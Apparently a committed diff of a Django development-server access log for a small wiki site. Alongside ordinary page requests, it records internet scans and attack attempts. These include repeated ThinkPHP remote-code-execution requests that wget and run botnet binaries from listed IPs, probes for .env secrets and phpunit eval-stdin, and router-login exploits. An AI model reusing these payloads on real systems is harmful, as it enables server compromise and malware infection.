+[04/Jun/2023 12:55:36,959] - Broken pipe from ('167.94.138.49', 57692)
+Not Found: /favicon.ico
+[04/Jun/2023 12:55:38] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 12:55:38] "GET / HTTP/1.1" 200 2210
+Not Found: /favicon.ico
+[04/Jun/2023 12:55:38] code 505, message Invalid HTTP version (2.0)
+[05/Jun/2023 08:01:26] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[04/Jun/2023 13:09:11] "GET / HTTP/1.1" 200 2210
+Not Found: /favicon.ico
+[04/Jun/2023 13:09:29] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 13:10:24] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 13:19:20] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[04/Jun/2023 14:06:25] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 14:12:19] "GET /wiki/science1-2 HTTP/1.1" 200 1781
+[04/Jun/2023 14:15:01] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 08:01:26,685] - Broken pipe from ('118.235.27.46', 55360)
+[04/Jun/2023 15:35:58] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 16:42:52] "GET /wiki/sc%E2%80%AAience1-1 HTTP/1.1" 200 5570
+[04/Jun/2023 16:52:27] code 400, message Bad request syntax ('\x05\x01\x00')
+[04/Jun/2023 16:52:32] code 400, message Bad request syntax ('\x05\x01\x00')
+[04/Jun/2023 16:52:39] code 400, message Bad request syntax ('\x05\x01\x00')
+[04/Jun/2023 16:54:31] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[04/Jun/2023 16:54:36] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[05/Jun/2023 08:01:26] " P¼Òã " 400 -
+[04/Jun/2023 17:39:15] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[04/Jun/2023 17:57:06] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://109.205.213.7/bins/UnHAnaAW.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[04/Jun/2023 18:12:06] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 18:21:05] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 2210
+[04/Jun/2023 18:31:56] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 2210
+[04/Jun/2023 18:58:09] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 19:28:44] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 20:09:12] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[04/Jun/2023 21:13:34] code 400, message Bad request version ('À\x14À')
+[05/Jun/2023 08:01:26] You're accessing the development server over HTTPS, but it only supports HTTP.
+[04/Jun/2023 21:14:15] code 400, message Bad request version ('À\x14À')
+[04/Jun/2023 21:30:43] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://135.148.104.21/bins/x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1")
+[04/Jun/2023 21:33:39] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[05/Jun/2023 08:01:26] "  /*à     Cookie: mstshash=Administr" 400 -
+[04/Jun/2023 22:09:09] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 22:16:27] code 400, message Bad request version ('À\x14À')
+[04/Jun/2023 22:16:47] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00{\x01\x00\x00w\x03\x03>¯d\x8a\x07ÅÇjóM1é\x11\x95ªNÕg{ÕY8\x96^±NG(1o'9\x00\x00\x1aÀ/À+À\x11À\x07À\x13À")
+[05/Jun/2023 08:01:26] You're accessing the development server over HTTPS, but it only supports HTTP.
+[04/Jun/2023 23:00:48] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 23:16:13] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 23:18:31] code 400, message Bad request version ('À\x14À')
+[04/Jun/2023 23:18:51] code 400, message Bad request version ('À\x14À')
+[05/Jun/2023 08:01:26] You're accessing the development server over HTTPS, but it only supports HTTP.
+[04/Jun/2023 23:50:18] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 01:00:26] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 01:44:37] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 02:05:14] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://98.159.98.243/AkitaXss/bin.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1")
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://98.159.98.243/AkitaXss/bin.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 -
+[05/Jun/2023 02:49:16,396] - Broken pipe from ('179.43.177.244', 47318)
+[05/Jun/2023 03:04:00] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 03:23:24] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 03:36:21] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://45.131.111.241/Yboats.x86 -O /tmp/.SHINJI; chmod 777 /tmp/.SHINJI; /tmp/.SHINJI thinkphp.selfrep' HTTP/1.1")
+[05/Jun/2023 03:43:29] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://109.205.213.7/bins/UnHAnaAW.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 04:35:33] "HEAD / HTTP/1.1" 200 0
+[05/Jun/2023 04:43:23] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://109.205.213.7/bins/UnHAnaAW.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 06:34:31] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://98.159.98.243/AkitaXss/bin.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1")
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://98.159.98.243/AkitaXss/bin.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 -
+[05/Jun/2023 07:10:26] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 07:20:27] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 07:43:19] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 07:59:07] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 08:01:13] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:13] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 08:01:16] "GET /wiki/07%20%EB%8C%80%EC%B9%AD%ED%82%A4%20%EC%95%94%ED%98%B8 HTTP/1.1" 200 4196
+[03/Jun/2023 21:26:29] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 08:01:25] "GET /actuator/health HTTP/1.1" 404 3142
+[03/Jun/2023 22:12:53] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[03/Jun/2023 22:59:14] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 00:09:45] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[04/Jun/2023 01:09:30] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:25] "GET /favicon.ico HTTP/1.1" 404 3133
+[05/Jun/2023 08:01:25] "GET /robots.txt HTTP/1.1" 404 3130
+[05/Jun/2023 08:01:25] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:25] "GET /api/.env HTTP/1.1" 404 3121
+[05/Jun/2023 08:01:25] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:25] "POST /boaform/admin/formLogin HTTP/1.1" 404 3170
+[05/Jun/2023 08:01:25] "GET /.env HTTP/1.1" 404 3109
+[04/Jun/2023 02:05:36] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[04/Jun/2023 02:24:43] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:25] "GET /favicon.ico HTTP/1.1" 404 3130
+[04/Jun/2023 04:08:53] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:25] "GET /favicon.ico HTTP/1.1" 404 3130
+[04/Jun/2023 04:46:16] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://159.223.22.86/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:25,847] - Broken pipe from ('118.235.27.46', 47972)
+[04/Jun/2023 04:56:16] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[04/Jun/2023 05:41:17] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 08:01:25,867] - Broken pipe from ('110.235.85.125', 46149)
+[05/Jun/2023 08:01:25] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 3250
+[05/Jun/2023 08:01:25] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 3174
+[05/Jun/2023 08:01:25,927] - Broken pipe from ('94.65.254.104', 45645)
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:26] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 3246
+[05/Jun/2023 08:01:26] You're accessing the development server over HTTPS, but it only supports HTTP.
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26] "GET /laravel/.env HTTP/1.1" 404 3133
+[05/Jun/2023 08:01:26] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26] "GET /console/ HTTP/1.1" 404 3124
+[05/Jun/2023 08:01:26] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 3188
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:26] "GET /app/.env HTTP/1.1" 404 3121
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26] "GET /druid/index.html HTTP/1.1" 404 3145
+[05/Jun/2023 08:01:26] "GET /_ignition/execute-solution HTTP/1.1" 404 3178
+[05/Jun/2023 08:01:26] "test" 400 -
+[05/Jun/2023 08:01:26] "VERSION" 400 -
+[05/Jun/2023 08:01:26] "GET /human.aspx HTTP/1.1" 404 3127
+[04/Jun/2023 10:15:48] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 08:01:26] "GET /human2.aspx HTTP/1.1" 404 3130
+[05/Jun/2023 08:01:26] "GET /Eetie0ph.aspx HTTP/1.1" 404 3136
+[05/Jun/2023 08:01:26] "GET /favicon.ico HTTP/1.1" 404 3130
+[04/Jun/2023 10:35:04] "GET /wiki/06%20One-Time%20Pad HTTP/1.1" 200 5407
+[05/Jun/2023 08:01:26] "GET /geoserver/web/ HTTP/1.1" 404 3139
+[05/Jun/2023 08:01:26] "GET /human.aspx HTTP/1.1" 404 3127
+[05/Jun/2023 08:01:26] "GET /Eetie0ph.aspx HTTP/1.1" 404 3136
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26] "GET /human2.aspx HTTP/1.1" 404 3130
+[05/Jun/2023 08:01:26,910] - Broken pipe from ('138.68.153.47', 38330)
+[05/Jun/2023 08:01:26] "GET /human2.aspx HTTP/1.1" 404 3130
+[05/Jun/2023 08:01:26] "GET /Eetie0ph.aspx HTTP/1.1" 404 3136
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26] "GET /actuator/gateway/routes HTTP/1.1" 404 3169
+[05/Jun/2023 08:01:26] "GET /geoserver HTTP/1.1" 404 3127
+[05/Jun/2023 08:01:26,291] - Broken pipe from ('211.105.48.119', 50720)
+[05/Jun/2023 08:01:26] "GET /.env HTTP/1.1" 404 3109
+[05/Jun/2023 08:01:26] "GET /wiki/02%EC%95%94%ED%98%B8%ED%95%99%EC%9D%98%20%EC%97%AD%EC%82%AC HTTP/1.1" 200 3306
+[05/Jun/2023 08:01:26] "GET /wiki/02%EC%95%94%ED%98%B8%ED%95%99%EC%9D%98%20%EC%97%AD%EC%82%AC HTTP/1.1" 200 3306
+[05/Jun/2023 08:01:26] "GET /wiki/02%EC%95%94%ED%98%B8%ED%95%99%EC%9D%98%20%EC%97%AD%EC%82%AC HTTP/1.1" 200 3306
+[05/Jun/2023 08:01:26] "GET /wiki/02%EC%95%94%ED%98%B8%ED%95%99%EC%9D%98%20%EC%97%AD%EC%82%AC HTTP/1.1" 200 3306
+[05/Jun/2023 08:01:26] "GET /favicon.ico HTTP/1.1" 404 3130
+[05/Jun/2023 08:01:26] "CONNECT google.com:443 HTTP/1.1" 400 65152
+[05/Jun/2023 08:01:26] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 400 65569
+[05/Jun/2023 08:01:26] "GET /favicon.ico HTTP/1.1" 404 3130
+[05/Jun/2023 08:01:26] "GET http://5.188.210.227/echo.php HTTP/1.1" 400 66721
+[05/Jun/2023 08:01:26] You're accessing the development server over HTTPS, but it only supports HTTP.
+[05/Jun/2023 08:01:26] "GET http://5.188.210.227/echo.php HTTP/1.1" 400 66721
+[05/Jun/2023 08:01:26] "CONNECT google.com:443 HTTP/1.1" 400 65152
+[05/Jun/2023 08:01:26] "CONNECT ipinfo.io:443 HTTP/1.1" 400 65124
+[05/Jun/2023 08:01:26] "GET http://5.188.210.227/echo.php HTTP/1.1" 400 66721
+[05/Jun/2023 08:01:26] "POST /GponForm/diag_Form?images/ HTTP/1.1" 400 65703
+[05/Jun/2023 08:01:26] "CONNECT google.com:443 HTTP/1.1" 400 65152
+[04/Jun/2023 12:54:30] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:26] "GET /favicon.ico HTTP/1.1" 404 3130
+[05/Jun/2023 08:01:26] "GET /favicon.ico HTTP/1.1" 404 3130
+[05/Jun/2023 08:01:26] "GET /favicon.ico HTTP/1.1" 404 3130
+[05/Jun/2023 08:01:26,665] - Broken pipe from ('167.94.138.49', 44852)
+[04/Jun/2023 13:09:05] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 08:01:26] "GET /favicon.ico HTTP/1.1" 404 3130
+[05/Jun/2023 08:01:26,665] - Broken pipe from ('167.94.138.49', 51922)
+[05/Jun/2023 08:01:26] "GET /favicon.ico HTTP/1.1" 404 3130
+[05/Jun/2023 08:01:26] "GET /favicon.ico HTTP/1.1" 404 3130
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26,685] - Broken pipe from ('118.235.27.46', 18653)
+[05/Jun/2023 08:01:26,685] - Broken pipe from ('118.235.27.46', 41422)
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26,685] - Broken pipe from ('118.235.27.46', 38118)
+[04/Jun/2023 14:44:22] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:26,695] - Broken pipe from ('118.235.27.46', 26341)
+[05/Jun/2023 08:01:26] " " 400 -
+[05/Jun/2023 08:01:26] " " 400 -
+[05/Jun/2023 08:01:26] " " 400 -
+[05/Jun/2023 08:01:26] " P¼Òã " 400 -
+[04/Jun/2023 16:54:41] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[04/Jun/2023 17:46:30] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://109.205.213.7/bins/UnHAnaAW.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[04/Jun/2023 21:13:54] code 400, message Bad request version ('À\x14À')
+[05/Jun/2023 08:01:26] You're accessing the development server over HTTPS, but it only supports HTTP.
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://135.148.104.21/bins/x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 -
+[04/Jun/2023 21:38:15] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 08:01:26,725] - Broken pipe from ('194.165.16.78', 65127)
+[05/Jun/2023 08:01:26] You're accessing the development server over HTTPS, but it only supports HTTP.
+[04/Jun/2023 22:17:07] code 400, message Bad request version ('À\x14À')
+[05/Jun/2023 08:01:26] You're accessing the development server over HTTPS, but it only supports HTTP.
+[04/Jun/2023 23:19:11] code 400, message Bad request version ('À\x14À')
+[05/Jun/2023 00:38:18] "GET / HTTP/1.0" 200 2210
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 02:26:33] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://45.131.111.241/Yboats.x86 -O /tmp/.SHINJI; chmod 777 /tmp/.SHINJI; /tmp/.SHINJI thinkphp.selfrep' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://109.205.213.7/bins/UnHAnaAW.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://109.205.213.7/bins/UnHAnaAW.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 06:48:36] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://45.131.111.241/Yboats.x86 -O /tmp/.SHINJI; chmod 777 /tmp/.SHINJI; /tmp/.SHINJI thinkphp.selfrep' HTTP/1.1")
+[05/Jun/2023 08:01:26] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 07:31:30] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[04/Jun/2023 00:26:59] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://109.205.213.7/bins/UnHAnaAW.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:26] "  /*à     Cookie: mstshash=Administr" 400 -
+[05/Jun/2023 08:01:25,817] - Broken pipe from ('198.199.76.233', 21236)
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://159.223.22.86/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
